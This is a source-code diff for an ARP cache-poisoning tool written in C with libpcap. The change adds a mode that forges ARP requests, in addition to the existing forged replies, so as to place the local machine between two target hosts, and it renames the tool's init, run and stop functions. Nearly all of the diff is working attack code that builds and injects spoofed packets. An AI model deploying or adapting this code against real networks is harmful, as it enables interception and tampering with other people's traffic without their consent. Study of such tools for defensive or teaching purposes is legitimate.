@@ -6,6 +6,7 @@
 #include "util.h"
 
 
+static bool       use_requests  = false;
 static bool       spoof_running = false;
 static pcap_t    *pcap_handle;
 static Host       local_host;
@@ -49,6 +50,15 @@ static void respoof(__attribute__ ((unused)) u_char *user,
                     const u_char * packet)
 {
     const ARPHeader *arp = (const ARPHeader*) (packet + ETH_HEADER_LEN);
+
+    if (use_requests && arp->operation == ARPOP_REPLY) {
+        if (ip_match(arp->sender_protocol_addr, targets[T1].ip) ||
+            ip_match(arp->sender_protocol_addr, targets[T2].ip)) {
+            fprintf(stdout, "Recieving an ARP reply from ");
+            print_ip(stdout, arp->sender_protocol_addr);
+            fprintf(stdout, "\n");
+        }
+    }
 
     if (arp->operation != ARPOP_REQUEST)
         return;
@@ -100,39 +110,65 @@ static void init_spoof_reply(ARPPacket *pack, Host *target, Host *sender, Host *
 }
 
 
-static void send_reply_unspoofs(void)
+static void init_spoof_request(ARPPacket *pack, Host *target, Host *sender, Host *local)
+{
+    memcpy(&(pack->eth_src_mac), local->mac, MAC_SIZE);
+    memcpy(&(pack->eth_des_mac), target->mac, MAC_SIZE);
+
+    pack->arp_operation = ARPOP_REQUEST;
+    memcpy(&(pack->arp_src_ip), sender->ip, IP_SIZE);
+    memcpy(&(pack->arp_des_ip), target->ip, IP_SIZE);
+    memcpy(&(pack->arp_src_mac), local->mac, MAC_SIZE);
+    memset(&(pack->arp_des_mac), 0, MAC_SIZE);
+}
+
+
+static void send_unspoofs(void)
 {
     uint8_t   buff[PACKET_LEN];
     ARPPacket pack;
 
-    init_spoof_reply(&pack, &targets[T1], &targets[T2], &targets[T2], true);
+    if (use_requests)
+        init_spoof_request(&pack, &targets[T1], &targets[T2], &targets[T2]);
+    else
+        init_spoof_reply(&pack, &targets[T1], &targets[T2], &targets[T2], true);
+
     write_packet(&pack, buff);
     pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);
 
     memset(&pack, 0, sizeof(ARPPacket));
 
-    init_spoof_reply(&pack, &targets[T2], &targets[T1], &targets[T1], true);
+    if (use_requests)
+        init_spoof_request(&pack, &targets[T2], &targets[T1], &targets[T1]);
+    else
+        init_spoof_reply(&pack, &targets[T2], &targets[T1], &targets[T1], true);
+
     write_packet(&pack, buff);
     pcap_inject(pcap_handle, (uint8_t*) &buff, PACKET_LEN);
 }
 
 
-void reply_spoof_init(pcap_t *pcap_h, Host t[TARGETS], Host *local, bool grat)
+void spoof_init(pcap_t *pcap_h, Host t[TARGETS], Host *local, bool grat, bool req)
 {
-    pcap_handle = pcap_h;
+    pcap_handle  = pcap_h;
+    use_requests = req;
 
     memcpy(&targets, t, sizeof(Host) * TARGETS);
     memcpy(&local_host, local, sizeof(Host));
 
-    init_spoof_reply(&packets[T1], &targets[T1], &targets[T2], &local_host, grat);
+    if (use_requests) {
+        init_spoof_request(&packets[T1], &targets[T1], &targets[T2], &local_host);
+        init_spoof_request(&packets[T2], &targets[T2], &targets[T1], &local_host);
+    } else {
+        init_spoof_reply(&packets[T1], &targets[T1], &targets[T2], &local_host, grat);
+        init_spoof_reply(&packets[T2], &targets[T2], &targets[T1], &local_host, grat);
+    }
     write_packet(&packets[T1], packet_buffer[T1]);
-
-    init_spoof_reply(&packets[T2], &targets[T2], &targets[T1], &local_host, grat);
     write_packet(&packets[T2], packet_buffer[T2]);
 }
 
 
-int reply_spoof_run(void)
+int spoof_run(void)
 {
     send_spoof_packet(T1);
     send_spoof_packet(T2);
@@ -141,13 +177,13 @@ int reply_spoof_run(void)
 }
 
 
-void reply_spoof_stop(void)
+void spoof_stop(void)
 {
     if (!spoof_running)
         return;
 
     if (unspoof)
-        send_reply_unspoofs();
+        send_unspoofs();
 
     pcap_breakloop(pcap_handle);
 }
